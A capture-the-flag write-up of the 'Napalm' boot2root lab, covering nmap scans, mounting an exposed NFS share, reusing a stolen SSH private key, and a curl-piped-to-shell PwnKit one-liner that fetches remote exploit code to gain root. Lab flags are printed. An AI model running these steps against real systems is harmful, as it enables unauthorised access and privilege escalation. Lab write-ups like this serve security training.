---
date:
  created: 2023-12-19
  updated: 2023-12-19
description: Napalm Writeup
tags:
  - nfs
  - ssh-key
  - linpeas
  - pwnkit
comments: true
---

# Napalm

Today we will doing Boot2Root machine, Napalm.

![](/images/writeup/internship/napalm/napalm.PNG)

## Reconnaissance

`IP = 192.168.8.90`

First and foremost, doing nmap scan to gather information of the machine. We get this. Scan TCP and UDP.

### PORT

```js
┌──(root㉿kali)-[/home/kali/Desktop/internship/napalm]
└─# nmap -p- --min-rate 5000 192.168.8.90             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-16 23:10 EST
Nmap scan report for 192.168.8.90
Host is up (0.0046s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
2049/tcp  open  nfs
39196/tcp open  unknown
45521/tcp open  unknown
49289/tcp open  unknown
58387/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
```
### TCP

```js
┌──(root㉿kali)-[/home/…/Desktop/internship/napalm/nmap]
└─# cat tcpscan.txt    
# Nmap 7.94SVN scan initiated Thu Nov 16 20:14:42 2023 as: nmap -sCV -p 22,111,39196,45521,58387 -oN nmap/tcpscan.txt 192.168.8.90
Nmap scan report for 192.168.8.90
Host is up (0.0050s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:3e:a2:9c:ab:b3:f4:f7:d0:51:5c:27:a3:c3:be:81 (RSA)
|   256 f8:e1:6a:d4:23:07:11:36:2a:cf:42:8a:7b:b9:2b:52 (ECDSA)
|_  256 8a:e0:75:ad:06:3f:06:e1:6e:94:07:ad:8f:42:33:e5 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      33388/udp6  nlockmgr
|   100021  1,3,4      39196/tcp   nlockmgr
|   100021  1,3,4      39348/tcp6  nlockmgr
|   100021  1,3,4      46481/udp   nlockmgr
|   100227  2,3         2049/tcp6  nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
39196/tcp open  nlockmgr 1-4 (RPC #100021)
45521/tcp open  mountd   1-3 (RPC #100005)
58387/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 16 20:15:12 2023 -- 1 IP address (1 host up) scanned in 30.76 seconds

```

We can see here, there is port `111` which is port for `rpcbind` and there `2049` port for `nfs` service connect to it
### UDP

```js
Nmap scan report for 192.168.8.90
Host is up, received reset ttl 128 (0.0047s latency).
Scanned at 2023-11-16 20:14:08 EST for 1597s
Not shown: 998 open|filtered udp ports (no-response)
PORT     STATE SERVICE REASON
111/udp  open  rpcbind udp-response ttl 128
2049/udp open  nfs     udp-response ttl 128

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Nov 16 20:40:45 2023 -- 1 IP address (1 host up) scanned in 1610.40 seconds
```

## Exploitation

For the exploitation part, I dunno nothing about `rpcbind`, so we ask our friend `mr.google` what is this and is there any writeup about this port. In simpler terms, it is a service that helps manage and facilitate communication between different processes on a network using the RPC protocol. I find something interesting on here about nfs

[https://0xdf.gitlab.io/2022/05/23/htb-jail.html#nfs---tcp-2049](https://0xdf.gitlab.io/2022/05/23/htb-jail.html#nfs---tcp-2049)

We will try this command

```js
┌──(root㉿kali)-[/home/kali/Desktop/internship/napalm]
└─# showmount -e 192.168.8.90  
Export list for 192.168.8.90:
/home/superpoweradmin/
```

It shows something interesting here, which is we can mount it to our machine and get the file into our disk. But first we need to do the directory `/mnt/opt` or any directory that we want to mount into.

```js
┌──(root㉿kali)-[/home/kali/Desktop/internship/napalm]
└─# mount -t nfs 192.168.8.90:/home/superpoweradmin /mnt/opt/
```

So right now it is successful connect to our machine. Directly we copy the file and put in our working machine directory for easy access.

```js
┌──(root㉿kali)-[/home/…/Desktop/internship/napalm/opt]
└─# ls -la
total 56
drwxr-xr-x 7 root root 4096 Nov 16 21:25 .
drwxr-xr-x 4 kali kali 4096 Nov 16 22:54 ..
-rw------- 1 root root   66 Nov 16 21:25 .bash_history
-rw-r--r-- 1 root root  220 Nov 16 21:25 .bash_logout
-rw-r--r-- 1 root root 3771 Nov 16 21:25 .bashrc
drwx------ 2 root root 4096 Nov 16 21:25 .cache
drwxr-x--- 3 root root 4096 Nov 16 21:25 .config
-r-------- 1 root root   39 Nov 16 21:25 flag2.txt
drwx------ 2 root root 4096 Nov 16 21:25 .gnupg
drwxr-xr-x 2 root root 4096 Nov 16 21:25 .nano
-rw-r--r-- 1 root root  675 Nov 16 21:25 .profile
-rw------- 1 root root    5 Nov 16 21:25 .python_history
drwx------ 2 root root 4096 Nov 17 01:35 .ssh
-rw-r--r-- 1 root root  167 Nov 16 21:25 .wget-hsts   
```

We can see there is a `flag2.txt`. Submit it first

`flag{141a18f81cf9a84b7361f01f9b1d2860}`

```js
┌──(root㉿kali)-[/home/…/internship/napalm/opt/.ssh]
└─# ls -la
total 24
drwx------ 2 root root 4096 Nov 17 01:35 .
drwxr-xr-x 7 root root 4096 Nov 16 21:25 ..
-rw------- 1 root root 1533 Nov 16 21:25 authorized_keys
-rw------- 1 root root 1679 Nov 16 21:25 id_rsa
-rw-r--r-- 1 root root  407 Nov 16 21:25 id_rsa.pub
-rw-r--r-- 1 root root  222 Nov 16 21:25 known_hosts
```

Then I see something interesting which is the `.ssh` file open it and tadaa there is `id_rsa` key. It make much more easier to get the foothold with this. Directly we can use this command to get access into the machine

```js
┌──(root㉿kali)-[/home/kali/Desktop/internship/napalm]
└─# ssh -i id_rsa superpoweradmin@192.168.8.90
#############################################################
#####							#####
#####							#####
#####		      NaPaLm SSH Server			#####
#####							#####
#####							#####
#####	Please Do not attack our server. Your IP are	#####
#####		     recorded in our log		#####
#####							#####
##### 			    flag1			#####
#####	   flag{72dbcd2759d2eeb78a8c9a93a146eba6}	#####
#############################################################
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

142 packages can be updated.
3 updates are security updates.

New release '18.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Fri Nov 17 12:47:28 2023 from 192.168.22.75
superpoweradmin@napalm-07:~$
```

We get into the machine and directly there is `flag1.txt`, grab it.

## Privileges Escalation

So for the privesc part, we need to know what is running in this machine and anything that we can exploit. `wget` command can be use, so we utilize it and download the `linpeas.sh`, `pspy64` or `lse.sh`.

After a while running all of this, I found nothing interesting and try to crack the id_rsa key perhaps it might be give something to me or exploit the kernel version and so on. 

Then, someone said that dont think to hard. just look on the `linpeas` carefully. With carefulness, I scroll it and there is in `linpeas` said that we can use `PwnKit` to exploit this machine. Directly I tried it with oneliner command. Run this and boom we got the root shell.

```js
superpoweradmin@napalm-07:~$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
root@napalm-07:/home/superpoweradmin#
```

Go to `/root` directory and grab the flag

```js
root@napalm-07:~# cat flag3.txt 
flag{fa4af3abc1a53c21e7b6598bb9fa7507}
```






